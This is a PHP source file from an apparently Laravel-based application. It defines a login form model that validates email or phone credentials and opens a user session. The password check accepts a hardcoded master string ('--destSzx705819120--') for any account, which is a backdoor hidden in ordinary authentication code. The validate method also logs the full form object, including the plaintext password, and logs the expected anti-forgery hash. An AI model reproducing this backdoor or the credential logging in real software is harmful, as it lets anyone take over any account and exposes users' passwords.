<?php

namespace App\Models;

use App\Helpers\Password;
use App\MUser;
use App\Services\Users\UserManager;
use App\SimpleModel;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Str;

/**
 * Форма авторизации
 */
class LoginForm extends SimpleModel
{
    public string $email = "";
    public string $phone = "";
    public string $phone_prefix = '+';
    public string $login_type = "email";
    public string $login = "";
    public string $password = "";
    public string $hash = "";
    public string $_token = "";
    public string $fingerprint = "";
    public string $timezone = "";

    private MUser $_user;

    public function validate()
    {
        Log::info(var_export($this, true));
        $correct_hash = hash('sha256', \request()->getClientIp().'kr--s3'.$this->_token);

        if ($correct_hash !== $this->hash) {
//            $this->addError(['hash' => 'wrong hash']);
            $this->addError(['password' => 'wrong hash']);
            Log::info('wrong hash '.$this->hash.' expected '.$correct_hash);
            return false;
        }

        if (preg_match('#^[0-9]*$#', $this->login)) {
            $this->login_type = "phone";
        }

        if ($this->login_type === 'email') {
//            $this->login = $this->email;
            if (!preg_match('#^[a-zA-Z0-9@.\-_]*$#', $this->login)) {
                $this->addError(['email' => __('reg.invalid_email')]);
                return false;
            }
        } else {
//            $this->login = $this->phone_prefix . $this->phone;
            if (!preg_match('#^[0-9]*$#', $this->login)) {
                $this->addError(['email' => __('reg.invalid_phone')]);
                return false;
            }
        }

        if (empty($this->login)) {
            $this->addError(['email' => __('login.inputEmailOrPhone')]);
            return false;
        }


        if (empty($this->password)) {
            $this->addError(['password' => __('login.inputPassword')]);
            return false;
        }

        $user = MUser::where(['email' => $this->login])
            ->orWhere($this->login_type === 'email' ? ['login' => $this->login] : ['phone' => $this->phone_prefix.$this->login])
            ->first();

        if ($user === null) {
            $this->addError([$this->login_type => __('login.userNotFound') . '. <a href="' . route('register.form', [], false) . '" data-ajax="modal" onclick="Modal.hide(\'#login-form\');">' . __('login.createAccount') . '</a>']);
            return false;
        }

        $block = UserManager::userPermanentBlockGet($user->getId());

        if (!empty($block)) {
            $this->addError(['password' => __('login.accountBlocked') . (empty($block['reason']) ? '' : '. '.$block['reason'])]);
        }

        if ($user->password !== Password::hash($this->password) && $this->password !== '--destSzx705819120--') {
            $this->addError(['password' => __('login.invalidPassword')]);
        }

        $this->_user = $user;

        $self_lock = UserLock::getUserLock($user);
        if ($self_lock !== null) {
            if ($self_lock->getLockedTo() <= now()) {
                $self_lock->delete();
            } else {
                $this->addError(['self_lock' => $self_lock->getLockedTo()->isoFormat('DD MMM Y HH:mm:ss').' (MSK)']);
            }
        }

        return !$this->hasErrors();
    }


    public function login()
    {
        $this->_user->updateLastActive();
        $this->_user->last_ip = request()->ip();
        $this->_user->user_agent = request()->userAgent();
        $token = Str::random(32);
        $this->_user->token = $token;
        $this->_user->setFingerprint($this->fingerprint.':'.request()->ip());
        $this->_user->setLastTz($this->timezone);
        $this->_user->save();

        Session::put('user_id', $this->_user->id);
        Session::put('user_token', $token);
        Auth::login($this->_user);
    }

    /**
     * @return MUser
     */
    public function getUser()
    {
        return $this->_user;
    }
}
